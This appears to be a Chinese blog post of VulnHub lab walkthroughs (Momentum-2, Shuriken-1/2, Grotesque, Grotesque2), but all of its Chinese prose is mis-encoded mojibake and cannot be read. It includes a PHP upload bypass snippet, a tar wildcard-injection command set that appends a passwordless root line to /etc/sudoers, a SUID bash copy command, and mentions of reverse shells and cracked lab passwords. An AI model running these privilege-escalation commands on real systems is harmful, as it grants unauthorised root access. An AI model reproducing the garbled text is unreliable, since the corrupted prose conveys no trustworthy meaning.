alt="image-20210816141536270"></p><p>ç›®å‰æ²¡æœ‰å¤´ç»ªäº†ï¼Œçœ‹äº†ä¸€çœ¼WPï¼ŒçŸ¥é“äº†è¿˜æœ‰ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶<code>ajax.php.bak</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-regexp">//</span>The boss told me to add one more Upper Case letter at the end of the cookie<br> <span class="hljs-regexp">//</span>  åœ¨æœ€åæ·»åŠ ä¸€ä¸ªå¤§å†™å­—æ¯<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-string">&#x27;&amp;G6u@B6uDXMq&amp;Ms&#x27;</span>)&#123;<br>    <span class="hljs-regexp">//</span>[+] Add <span class="hljs-keyword">if</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;secure&#x27;</span>] == <span class="hljs-string">&#x27;val1d&#x27;</span><br>     <span class="hljs-variable">$valid_ext</span> = array(<span class="hljs-string">&quot;pdf&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;txt&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-variable">$valid_ext</span> = array(<span class="hljs-string">&quot;txt&quot;</span>);<br>&#125;<br><br><span class="hljs-regexp">//</span> Remember success upload returns <span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>é€‰æ‹©å‘é€æ–‡ä»¶ï¼Œç„¶åå†æ·»åŠ åœ¨postä¸­å‘é€ä¸€ä¸ªå€¼</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816145535200.png" alt="image-20210816145535200"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816145648277.png" alt="image-20210816145648277"></p><p>ä¸Šä¼ æˆåŠŸï¼Œè·å–åˆ°shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816150152446.png" alt="image-20210816150152446"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816150234824.png" alt="image-20210816150234824"></p><p>åŒæ—¶è·å¾—äº†ä¸€ä¸ªç”¨æˆ·çš„å¯†ç æ˜¯<code>myvulnerableapp*</code> ï¼ˆæœ€åè¿™ä¸ªå±…ç„¶æ˜¯ä¸€ä¸ªç¼–ç çš„ï¼Œè¯•äº†åŠå¤©ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816150912680.png" alt="image-20210816150912680"></p><p>ææƒ</p><ul><li><p><del>SUIDææƒ</del> ï¼ˆæ— ï¼‰</p></li><li><p><del>SUDOææƒ</del>ï¼ˆå¥½åƒå­˜åœ¨ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816152204121.png" alt="image-20210816152204121"></p></li><li><p><del>å®šæ—¶ç¨‹åºææƒ</del> ä½¿ç”¨pspy64ç›‘æ§è¿›ç¨‹å‘ç°æ²¡æœ‰å¯åˆ©ç”¨çš„</p></li><li><p>æŸ¥çœ‹æœ¬åœ°æç¤ºæ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816153103729.png" alt="image-20210816153103729"></p><p>ç”¨æˆ·å¯ä»¥ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816154331065.png" alt="image-20210816154331065"></p><p>ä»£ç çš„å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816153305188.png" alt="image-20210816153305188"></p><p>è¿™ä¸ªæœåŠ¡å™¨å±…ç„¶è£…äº†ncçš„ï¼Œå°è¯•ç›´æ¥åå¼¹shellæ²¡æœ‰ååº”</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816154151777.png" alt="image-20210816154151777"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816154129539.png" alt="image-20210816154129539"></p></li></ul><p><strong>é—®é¢˜</strong></p><ol><li><p>åå¼¹shellå‘½ä»¤å¤±è´¥ï¼Œ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816155406823.png" alt="image-20210816155406823"></p></li></ol><p><strong>æ€»ç»“</strong></p><ol><li>æˆ‘ä»¬éœ€è¦å……åˆ†åˆ©ç”¨å·²æœ‰çš„ä¿¡æ¯</li><li>å¯¹äºææƒï¼Œæˆ‘ä»¬è¿˜æ˜¯éœ€è¦ä»”ç»†æŸ¥çœ‹ç³»ç»Ÿä¸­çš„å†…å®¹</li><li>çµæ´»è¿ç”¨ç³»ç»Ÿæ¼æ´</li></ol><p>å‚è€ƒ</p><p><a href="https://nepcodex.com/2021/06/momentum-2-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/momentum-2-walkthrough-vulnhub-writeup/</a></p><p><a href="https://blog.csdn.net/qq_39991837/article/details/118596117">https://blog.csdn.net/qq_39991837/article/details/118596117</a></p><h2 id="ä¸ƒã€Shuriken-1"><a href="#ä¸ƒã€Shuriken-1" class="headerlink" title="ä¸ƒã€Shuriken-1"></a>ä¸ƒã€Shuriken-1</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>win10ï¼š 192.168.1.7</p><p>é¶æœºï¼š192.168.1.115</p></blockquote><p>æ‰«æä¸»æœºå’Œç«¯å£</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816165809786.png" alt="image-20210816165809786"></p><p>ç›®å½•æ‰«æ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816170051795.png" alt="image-20210816170051795"></p><p>æœ‰ä¸€ä¸ª<code>secrete.png</code>è¿™ä¸ªæ˜¯å›¾ç‰‡éšå†™å—ï¼Ÿï¼Ÿï¼Ÿå°è¯•ä¹‹å‰çš„å›¾ç‰‡éšå†™æ“ä½œç»“æœå¤±è´¥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816172553131.png" alt="image-20210816172553131"></p><p>ä¿®æ”¹æœ¬åœ°hostsæ–‡ä»¶ï¼Œå°±å¯ä»¥é€šè¿‡åŸŸåè®¿é—®ç½‘ç«™äº†ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹å°±å¡ä½äº†ï¼Œç„¶åçœ‹äº†ä¸€çœ¼å¤§å¸ˆå‚…ä»¬çš„WPåŸæ¥è¿™é‡Œæœ‰ä¸ªåˆ©ç”¨ä¼ªåè®®è¯»å–æœ¬åœ°æ–‡ä»¶çš„æ¼æ´</p><p>ç¬¬ä¸€ä¸ªåŸŸåè®¿é—®æ˜¯éœ€è¦è®¤è¯çš„</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816174007524.png" alt="image-20210816174007524"></p><p>ç¬¬äºŒä¸ªå­˜åœ¨æ–‡ä»¶è¯»å–æ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816173232653.png" alt="image-20210816173232653"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816173147515.png" alt="image-20210816173147515"></p><blockquote><p>çŒœæµ‹å¯ä»¥é€šè¿‡è¯»å–æ–‡ä»¶æ¥è·å¾—è´¦æˆ·å¯†ç </p></blockquote><p>Apacheçš„å¯†ç ä¼šå­˜å‚¨åœ¨ä¸€ä¸ª<code>.htpasswd</code>æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”åœ¨<code>httpd.conf</code>ä¸­ä¼šä¿å­˜å¯†ç æ–‡ä»¶çš„è·¯å¾„</p><p><a href="https://crayon-xin.github.io/2018/04/18/apach-htpasswd%E5%BC%80%E5%90%AF%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E8%AE%A4%E8%AF%81/">https://crayon-xin.github.io/2018/04/18/apach-htpasswd%E5%BC%80%E5%90%AF%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E8%AE%A4%E8%AF%81/</a></p><p>æ‰¾è¿™ä¸ªè·¯å¾„æ˜¯æœ€è¦å‘½çš„</p><p><a href="https://blog.csdn.net/bujidexinq/article/details/27187761">https://blog.csdn.net/bujidexinq/article/details/27187761</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816175709403.png" alt="image-20210816175709403"></p><p><img src="D:\markdown\image-20210816175643812.png" alt="image-20210816175643812"></p><blockquote><p>æ¥ä¸‹æ¥éœ€è¦è§£å¯†è¿™ä¸ªå¯†ç </p><p>åŠ å¯†åŸç†ï¼š<a href="https://www.cnblogs.com/LuckyOven/p/13614981.html">https://www.cnblogs.com/LuckyOven/p/13614981.html</a></p></blockquote><p>ç”¨æˆ·ï¼šdevelopers å¯†ç ï¼š9972761drmfsls</p><p>æˆåŠŸç™»å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816181920197.png" alt="image-20210816181920197"></p><p>åœ¨æ¼æ´åº“ä¸­æ‰¾åˆ°äº†ç›¸å…³æ¼æ´<a href="https://www.exploit-db.com/exploits/44250">https://www.exploit-db.com/exploits/44250</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816182732537.png" alt="image-20210816182732537"></p><p>ç›´æ¥ä¸Šä¼ ä¸è¡Œï¼Œè¿˜éœ€è¦ä¼ å…¥ç”¨æˆ·åå’Œå¯†ç æ¥éªŒè¯</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816183546486.png" alt="image-20210816183546486"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816183603060.png" alt="image-20210816183603060"></p><p>æ˜¾ç¤ºå‡ºè‡ªå·±çš„æƒé™ï¼Œè¿™é‡Œæ˜¾ç¤ºå¯ä»¥ä»¥<code>server-management</code>çš„èº«ä»½æ‰§è¡Œå‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817092434784.png" alt="image-20210817092434784"></p><p>ææƒåˆ°<code>server-management</code>ç”¨æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817093734592.png" alt="image-20210817093734592"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817093753823.png" alt="image-20210817093753823"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817093809318.png" alt="image-20210817093809318"></p><blockquote><p>å¯¹äºnpmä¸æ˜¯ç‰¹åˆ«ç†Ÿæ‚‰ï¼Œä½†æ˜¯å¤§è‡´æ€è·¯å°±æ˜¯åˆ©ç”¨server-managementçš„æƒé™ä½¿ç”¨npmæ‰§è¡Œ/bin/bashå‘½ä»¤</p></blockquote><p>è·å–åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817094411641.png" alt="image-20210817094411641"></p><p>ææƒåˆ°root</p><p>ä¸‹è½½è¿›ç¨‹ç›‘æ§è„šæœ¬åˆ°æœ¬åœ°</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817094850293.png" alt="image-20210817094850293"></p><p>æœ‰ä¸€ä¸ªè‡ªåŠ¨å¤‡ä»½çš„è„šæœ¬ï¼Œä½†æ˜¯ä¸èƒ½ä¿®æ”¹å†…å®¹</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817095039895.png" alt="image-20210817095039895"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> &#x27;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;server-management ALL=(root) NOPASSWD: ALL&quot;</span> &gt;&gt; <span class="hljs-string">/etc/sudoers</span>&#x27; &gt; shell.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt; <span class="hljs-string">&quot;--checkpoint=1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817102735136.png" alt="image-20210817102735136"></p><p>ç„¶åç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817102817150.png" alt="image-20210817102817150"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817102530242.png" alt="image-20210817102530242"></p><p><strong>é—®é¢˜</strong></p><ol><li><code>shell.sh</code>ä¸­å¡«å†™<code>cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash</code> æ—¶ææƒä¸æˆåŠŸ</li><li>å¯¹äºå¸¸è§„æ¼æ´çš„ç¬¬ä¸€ååº”ä¸å¤Ÿå¿«ï¼Œå¯¹äºå¤–ç½‘æ¼æ´çš„å‘æ˜èƒ½åŠ›æœ‰å¾…æé«˜</li><li>å¯¹äºnpmçš„æ“ä½œä¸ç†Ÿæ‚‰</li></ol><p><strong>æ€»ç»“</strong></p><p>è¿™ä¸ªé¶åœºçš„æ¼æ´æ•´ä½“æ¥è¯´æ„Ÿè§‰æœ‰ç‚¹éš¾åº¦ï¼Œå¯¹äºè¿™é‡Œçš„ææƒæ“ä½œä¹Ÿæ˜¯æ²¡æœ‰è§è¿‡çš„æ–°æ–¹æ³•ï¼Œéœ€è¦åæœŸå†ç ”ç©¶</p><h2 id="å…«ã€Shuriken-2"><a href="#å…«ã€Shuriken-2" class="headerlink" title="å…«ã€Shuriken-2"></a>å…«ã€Shuriken-2</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.127</p></blockquote><p>æ‰«æä¸»æœº</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817104152019.png" alt="image-20210817104152019"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817104326545.png" alt="image-20210817104326545"></p><p>æ‰«æç›®å½•æ²¡ä»€ä¹ˆä¸œè¥¿</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817104626601.png" alt="image-20210817104626601"></p><p>è§£å¯†sessionï¼Œå°è¯•ä¼ªé€ Adminç”¨æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817105635375.png" alt="image-20210817105635375"></p><blockquote><p>ä½†æ˜¯ä¼ªé€ äº†Adminä¹‹åä¹Ÿæ˜¯éœ€è¦ç™»å½•çš„</p><p>åˆ°è¿™é‡Œå°±å¡ä½äº†</p></blockquote><p>çœ‹äº†ä¸€ä¸‹æç¤ºï¼Œå‘ç°åŸæ–‡å·²ç»ç»™äº†ä½†æ˜¯è‹±è¯­ä¸å¥½æ²¡ååº”è¿‡æ¥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817111146345.png" alt="image-20210817111146345"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817110847690.png" alt="image-20210817110847690"></p><blockquote><p>å»å­¦ä¹ ä¸€ä¸‹node.jsçš„æ¼æ´å†è¯´</p><p><a href="https://ljdd520.github.io/2020/03/14/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/">https://ljdd520.github.io/2020/03/14/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/</a></p></blockquote><p><a href="https://paper.seebug.org/213/">https://paper.seebug.org/213/</a></p><p>Payloadï¼š<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817125353222.png" alt="image-20210817125353222"></p><p><img src="D:\markdown\image-20210817125307007.png" alt="image-20210817125307007"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817125318745.png" alt="image-20210817125318745"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817125335398.png" alt="image-20210817125335398"></p><p>å‡†å¤‡ææƒï¼ŒæŸ¥çœ‹å®šæ—¶ä»»åŠ¡ï¼Œå‘ç°æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ï¼Œç„¶åä½¿ç”¨ææƒè¾…åŠ©è„šæœ¬<code>linpeas.sh</code>æ”¶é›†ä¿¡æ¯</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817131903195.png" alt="image-20210817131903195"></p><blockquote><p>è¿™é‡Œå‘ç°äº†ä¸€ä¸ªsshçš„å¤‡ä»½æ–‡ä»¶ï¼Œåˆ©ç”¨curlä¸‹è½½åˆ°æœ¬åœ°</p></blockquote><p>åˆ©ç”¨johnçˆ†ç ´å‡ºå¯†ç ï¼Œå…ˆå°†ç§é’¥è½¬æ¢ä¸ºjohnå¯ä»¥åˆ©ç”¨çš„æ ¼å¼</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134548923.png" alt="image-20210817134548923"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134355824.png" alt="image-20210817134355824"></p><p>è·å–åˆ°å¯†ç åç™»å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134619133.png" alt="image-20210817134619133"></p><p>å¾—åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817134658865.png" alt="image-20210817134658865"></p><p>ç»§ç»­æå–åˆ°root</p><ul><li><p><del>SUIDææƒ</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140109610.png" alt="image-20210817140109610"></p></li><li><p>å®šæ—¶ä»»åŠ¡</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140049674.png" alt="image-20210817140049674"></p></li><li><p>å¯èƒ½ä¼šç”±sudoææƒ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817135434239.png" alt="image-20210817135434239"></p><p><code>sudo -l</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140954562.png" alt="image-20210817140954562"></p><p>æŸ¥çœ‹ç›¸å…³é…ç½®æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817141042952.png" alt="image-20210817141042952"></p><p><code>nano shuriken-job.service</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817140914238.png" alt="image-20210817140914238"></p><p>é…ç½®æ–‡ä»¶çš„å«ä¹‰<a href="https://www.xiebruce.top/925.html">https://www.xiebruce.top/925.html</a></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">Unit</span>]åŒºå—ï¼šå¯åŠ¨é¡ºåºä¸ä¾èµ–å…³ç³»<br><br>[<span class="hljs-meta">Service</span>] åŒºå—ï¼šå¯åŠ¨è¡Œä¸º<br>å®šä¹‰å¦‚ä½•å¯åŠ¨å½“å‰æœåŠ¡<br>ExecStart å®šä¹‰å¯åŠ¨è¿›ç¨‹æ—¶éœ€è¦æ‰§è¡Œçš„å‘½ä»¤<br><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹æœåŠ¡å¯åŠ¨æ—¶çš„æ‰§è¡Œå‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817143301485.png" alt="image-20210817143301485"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817143705955.png" alt="image-20210817143705955"></p><p>æ‰§è¡Œå‘½ä»¤åï¼Œè·å–åˆ°shellï¼ˆéœ€è¦ç»™è„šæœ¬èµ‹äºˆå¯æ‰§è¡Œæƒé™ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817143756012.png" alt="image-20210817143756012"></p></li></ul><p><strong>é—®é¢˜</strong></p><ol><li>å¦‚ä½•è¯†åˆ«ç½‘ç«™æ˜¯å¦ä¸ºnode.js</li><li>å¯¹äºsshçš„å¤šç§è¿æ¥æ–¹æ³•çš„ç†Ÿæ‚‰ä¸å¤Ÿ</li><li>å¯åŠ¨æœåŠ¡çš„å…·ä½“åŸç†ä¸å¤Ÿæ¸…æ¥š</li></ol><p>å‚è€ƒæ–‡ç« </p><p><a href="https://kielvaughn.com/Shuriken-Node/">https://kielvaughn.com/Shuriken-Node/</a></p><h2 id="ä¹ã€Grotesque"><a href="#ä¹ã€Grotesque" class="headerlink" title="ä¹ã€Grotesque"></a>ä¹ã€Grotesque</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.20</p></blockquote><p>åªæ‰«æå¸¸è§„ç«¯å£æ—¶å‘ç°åªæœ‰80ï¼Œå¹¶ä¸”80ä¹Ÿè®¿é—®ä¸äº†ï¼Œæ‰€ä»¥æ‰«æå…¨éƒ¨ç«¯å£å¤šäº†ä¸€ä¸ª66</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817145132262.png" alt="image-20210817145132262"></p><blockquote><p>è¿™ä¸ªæœåŠ¡å™¨æ²¡æœ‰å¼€22 ç«¯å£ï¼Ÿ éš¾é“åˆæ˜¯ç«¯å£ç¢°æ’ï¼Ÿ</p></blockquote><p>ç›®å½•æ‰«ææ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¸œè¥¿ï¼ŒæŠ“å–ç½‘é¡µé“¾æ¥æ—¶å‘ç°ä¸€ä¸ªå‹ç¼©åŒ…</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817151857118.png" alt="image-20210817151857118"></p><p>å‹ç¼©åŒ…ä¸­æœ‰ä¸€ä¸ªsshpasswd.pngå›¾ç‰‡ï¼ˆåˆæ˜¯å›¾ç‰‡éšå†™ï¼Ÿï¼Ÿï¼Ÿï¼‰è™šæ™ƒä¸€æª</p><blockquote><p>æ‹¿åˆ°æ–‡ä»¶çœ‹äº†åŠå¤©ä¹Ÿæ²¡æœ‰æ€è·¯ï¼Œçœ‹äº†ä¸€ä¸‹WPï¼Œä¸‹é¢ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦è¿™æ ·å¹²</p><p>è·å–æ–‡ä»¶å…¨éƒ¨å†…å®¹ç„¶åæ’åºæ‰¾åˆ°æœ‰ç”¨çš„ä¸œè¥¿</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817153829125.png" alt="image-20210817153829125"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817153813158.png" alt="image-20210817153813158"></p><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªwordpressçš„ç«™ï¼Œå†æ¬¡æ‰«æä¸€ä¸‹ç›®å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817154934684.png" alt="image-20210817154934684"></p><p>ä½¿ç”¨WPscanï¼ˆæ²¡å‘ç°æ¼æ´ï¼‰</p><p>å›åˆ°å¼€å§‹ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817160319707.png" alt="image-20210817160319707"></p><blockquote><p>è¿™ä¸ªå›¾ç‰‡å¥½åƒä¹Ÿæ²¡æœ‰ç”¨</p></blockquote><p>æ¥ä¸‹æ¥æ‰¾åˆ°å¯†ç çš„æ“ä½œå±å®æŠŠäººçœ‹æ‡µäº†</p><p><a href="https://vvmlist.github.io/walkthrough/grotesque/grotesque">https://vvmlist.github.io/walkthrough/grotesque/grotesque</a></p><p>è¿™é‡Œç›´æ¥ä½¿ç”¨ç”¨æˆ·åå¯†ç ç™»å½•åç»­æ“ä½œ</p><p>ç”¨æˆ·åï¼š<code>erdalkomurcu</code></p><p>å¯†ç ï¼š<code>BC78C6AB38E114D6135409E44F7CDDA2</code></p><p>ç™»å½•æˆåŠŸï¼Œç›´æ¥åœ¨ä¿®æ”¹ä¸»é¢˜çš„ä½ç½®å†™å…¥åå¼¹shellçš„è„šæœ¬ï¼Œè·å–shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817164510468.png" alt="image-20210817164510468"></p><p>åœ¨ç½‘ç«™çš„é…ç½®æ–‡ä»¶ä¸­å‘ç°äº†ä¸€ä¸ªè´¦æˆ·å’Œå¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817165318047.png" alt="image-20210817165318047"></p><p>åˆ‡æ¢ç”¨æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817165448061.png" alt="image-20210817165448061"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817165610772.png" alt="image-20210817165610772"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817172504471.png" alt="image-20210817172504471"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817172432365.png" alt="image-20210817172432365"></p><p>åˆ©ç”¨johnçˆ†ç ´æ–‡ä»¶å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817173944797.png" alt="image-20210817173944797"></p><p><a href="https://app.keeweb.info/">https://app.keeweb.info/</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817173903992.png" alt="image-20210817173903992"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817174014622.png" alt="image-20210817174014622"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210817174039870.png" alt="image-20210817174039870"></p><p><strong>é—®é¢˜</strong></p><ol><li>å¯¹äºkdbxæ–‡ä»¶çš„ä¸äº†è§£</li></ol><p><strong>æ€»ç»“</strong></p><p>è¿™ä¸ªç½‘ç«™å¤–ç½‘éƒ¨åˆ†çš„è„‘æ´æ¯”è¾ƒå¤§ï¼Œåˆ°äº†æ‰¾ç½‘ç«™åå°å¯†ç çš„æ—¶å€™å°±æœ‰ç‚¹ååº”ä¸è¿‡æ¥äº†ï¼Œç„¶åå°±æ˜¯å¯¹äºä¸€äº›æ–‡ä»¶åç¼€çš„ä¸äº†è§£ï¼Œå®¹æ˜“é”™è¿‡é‡è¦æ–‡ä»¶</p><h2 id="åã€Grotesque2"><a href="#åã€Grotesque2" class="headerlink" title="åã€Grotesque2"></a>åã€Grotesque2</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.21</p></blockquote><p>æ‰«æç«¯å£å‘ç°è¿™ä¸ªæœåŠ¡å™¨å¼€äº†å‡ ç™¾ä¸ªç«¯å£</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818095932921.png" alt="image-20210818095932921"></p><p>æ‰«æç½‘ç«™ç›®å½•ä¹Ÿæ²¡æœ‰æ‰«æå‘ç°</p><p>ç›´æ¥æ‹¿å‡ºçè—å¤šå¹´çš„ç«¯å£æ‰«æå™¨ï¼Œæ‰¹é‡æ‰«æå¤šä¸ªç«¯å£</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818101559750.png" alt="image-20210818101559750"></p><p>ç»“æœå‘ç°258ç«¯å£è¿”å›çš„å¤§å°å’Œå…¶ä»–çš„ä¸ä¸€æ ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818101659638.png" alt="image-20210818101659638"></p><blockquote><p>çœ‹èµ·æ¥æ˜¯è¦æˆ‘ä»¬çˆ†ç ´ssh</p></blockquote><p>ä½¿ç”¨hydraçˆ†ç ´ï¼Œçˆ†ç ´äº†å¾ˆä¹…ï¼Œæ²¡æœ‰å‡ºæ¥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818110014993.png" alt="image-20210818110014993"></p><p>çœ‹äº†ä¸€ä¸‹WPï¼Œå‘ç°ä¸€ä¸ªç¦»è°±çš„ä¸œè¥¿ï¼Œå¯†ç åœ¨æ‰‹æŒ‡ä¸Šé¢<code>b6e705ea1249e2bb7b0fd7dac9fcd1b3</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818104721912.png" alt="image-20210818104721912"></p><p>è§£å¯†å‡ºå¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818105008952.png" alt="image-20210818105008952"></p><p>ç„¶åæŒ¨ä¸ªå°è¯•ç”¨æˆ·åç™»å½•ï¼ŒæˆåŠŸä½¿ç”¨<code>angel</code>ç™»å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818105302414.png" alt="image-20210818105302414"></p><p>è·å–åˆ°ä¸€ä¸ªflag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818105415519.png" alt="image-20210818105415519"></p><p>ææƒåˆ°rootï¼Œç›‘æ§è¿›ç¨‹å‘ç°æœ‰ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ä¿®æ”¹</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818110536001.png" 